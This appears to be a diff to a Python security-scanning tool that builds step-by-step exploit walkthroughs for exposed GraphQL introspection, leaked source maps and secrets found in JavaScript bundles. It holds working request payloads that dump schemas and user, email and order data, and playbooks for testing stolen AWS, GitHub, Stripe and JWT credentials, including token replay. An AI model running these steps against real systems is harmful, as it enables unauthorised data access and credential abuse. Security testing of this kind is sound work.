@@ -4972,6 +4972,174 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "note": "Another common override header"},
         ])
 
+    elif etype in ("graphql_introspection", "graphql_data_exposure"):
+        # GraphQL walkthrough: run introspection, then auto-derive
+        # queries for sensitive-looking types. The validator parses
+        # the JSON response and flags when __schema or any sensitive
+        # fields are returned.
+        _gql_path = ei.get("path", "/graphql")
+        _gql_url = base_url.rstrip("/") + _gql_path
+
+        def _gql_check(r: ExploitResult):
+            body = r.response_body or ""
+            try:
+                data = json.loads(body[:200000])
+            except Exception:
+                data = None
+            if isinstance(data, dict) and data.get("data"):
+                d = data["data"]
+                if isinstance(d, dict) and d.get("__schema"):
+                    types = d["__schema"].get("types", [])
+                    r.success = True
+                    r.confidence = 0.95
+                    r.evidence = (f"Introspection returned "
+                                  f"{len(types)} types")
+                    r.false_positive_risk = "very_low"
+                    return
+                # Other queries — any non-null data field is informative.
+                if any(v is not None for v in d.values() if isinstance(d, dict)):
+                    r.success = True
+                    r.confidence = 0.85
+                    r.evidence = "Query returned data"
+                    r.false_positive_risk = "low"
+                    return
+            if isinstance(data, dict) and data.get("errors"):
+                errs = data.get("errors", [])
+                msgs = [e.get("message", "") for e in errs[:3] if isinstance(e, dict)]
+                r.evidence = f"GraphQL errors: {' | '.join(msgs)[:120]}"
+                r.confidence = 0.2
+                return
+            if r.status_code and r.status_code >= 400:
+                r.evidence = f"HTTP {r.status_code}"
+                r.confidence = 0.1
+
+        _introspect_q = (
+            '{"query":"{ __schema { types { name fields '
+            '{ name type { name kind } } } } }"}'
+        )
+        _short_introspect = (
+            '{"query":"{ __schema { queryType { name } '
+            'mutationType { name } } }"}'
+        )
+        _common_queries = [
+            ('{"query":"{ users { id email username } }"}',
+             "enumerate users (common type names)"),
+            ('{"query":"{ me { id email role } }"}',
+             "current-user context"),
+            ('{"query":"{ products { id price } }"}',
+             "product listing"),
+            ('{"query":"{ orders { id userId total } }"}',
+             "order history"),
+        ]
+
+        steps = [
+            {"title": "Confirm GraphQL endpoint",
+             "request": _post(_gql_url, None,
+                              extra_headers={"Content-Type": "application/json"}),
+             "validate": _gql_check,
+             "note": ("Empty POST — server should reply with "
+                      "'Must provide query' JSON")},
+            {"title": "Short introspection (queryType / mutationType)",
+             "request": {"method": "POST", "url": _gql_url,
+                         "data": _short_introspect,
+                         "headers": {"Content-Type": "application/json"},
+                         "allow_redirects": True},
+             "validate": _gql_check,
+             "note": "If this works, full introspection is open"},
+            {"title": "Full introspection (dump whole schema)",
+             "request": {"method": "POST", "url": _gql_url,
+                         "data": _introspect_q,
+                         "headers": {"Content-Type": "application/json"},
+                         "allow_redirects": True},
+             "validate": _gql_check,
+             "warning": "Large response — full API surface area revealed",
+             "note": "Attack-surface map for every downstream step"},
+        ]
+        for q, desc in _common_queries:
+            steps.append({
+                "title": f"Test query: {desc}",
+                "request": {"method": "POST", "url": _gql_url,
+                            "data": q,
+                            "headers": {"Content-Type": "application/json"},
+                            "allow_redirects": True},
+                "validate": _gql_check,
+                "note": f"Many schemas expose these names",
+                "warning": "May dump sensitive data if unauthenticated",
+            })
+
+    elif etype == "sourcemap_exposure":
+        # Walkthrough for exposed source maps. Fetch the .map file and
+        # print the sources[] array so the operator sees exactly which
+        # modules got leaked.
+        _sm_url = target
+        def _sm_check(r: ExploitResult):
+            body = r.response_body or ""
+            try:
+                data = json.loads(body[:500000])
+            except Exception:
+                data = None
+            if isinstance(data, dict) and data.get("sources"):
+                src_paths = data["sources"]
+                if isinstance(src_paths, list) and src_paths:
+                    r.success = True
+                    r.confidence = 0.99
+                    r.evidence = (f"Source map exposes {len(src_paths)} "
+                                  f"source file(s). Sample: "
+                                  f"{src_paths[0][:80]}")
+                    r.false_positive_risk = "very_low"
+                    return
+            r.evidence = "Not a valid source map or sources missing"
+            r.confidence = 0.2
+
+        steps = [
+            {"title": "Fetch source map",
+             "request": _get(_sm_url),
+             "validate": _sm_check,
+             "note": "JSON with 'sources' and 'sourcesContent' arrays"},
+            {"title": "Parse sources[] — original source paths",
+             "note": ("Each entry in sources[] is an original file "
+                      "path. If sourcesContent[] is populated, the "
+                      "actual source code is in there base64/inlined."),
+             "request": None},
+        ]
+
+    elif etype == "js_secret_leak":
+        # Walkthrough for secrets discovered in same-origin JS bundles.
+        # Report-only — we don't fire live requests against the
+        # provider APIs (that would leak Tor-origin probes to
+        # third-party APIs we have no control over).
+        _secret_kind = ei.get("secret_kind", "unknown")
+        _provider_notes = {
+            "aws_key": ("Pair with the AWS secret from the same "
+                        "bundle (grep for 'AKIA' nearby). Test "
+                        "with `aws sts get-caller-identity` on a "
+                        "separate box — NEVER from this session."),
+            "github_token": ("Test scopes with `gh auth status` / "
+                             "`curl -H 'Authorization: token <tok>' "
+                             "https://api.github.com/user`. Stored "
+                             "GitHub tokens can repo/delete."),
+            "stripe_key": ("sk_live_ keys are DANGEROUS — they can "
+                           "charge cards and issue refunds. Test "
+                           "with the Stripe CLI in test mode only, "
+                           "or report to the target immediately."),
+            "jwt_token": ("Decode with jwt.io (or jwt-cli). Look at "
+                          "the 'exp' claim — if it's in the future, "
+                          "replay the token against authenticated "
+                          "endpoints."),
+        }
+        note = _provider_notes.get(
+            _secret_kind,
+            "Map the secret's format to a provider, test cautiously "
+            "from a separate host.")
+        steps = [
+            {"title": f"Secret type: {_secret_kind}",
+             "note": f"Evidence: {ei.get('method', note)[:200]}",
+             "request": None},
+            {"title": "Verification playbook",
+             "note": note,
+             "request": None},
+        ]
+
     elif etype == "brute_force_viable":
         # Brute-force walkthrough — generate a reference hydra cmd and a
         # small credential-stuffing probe using the most common passwords.
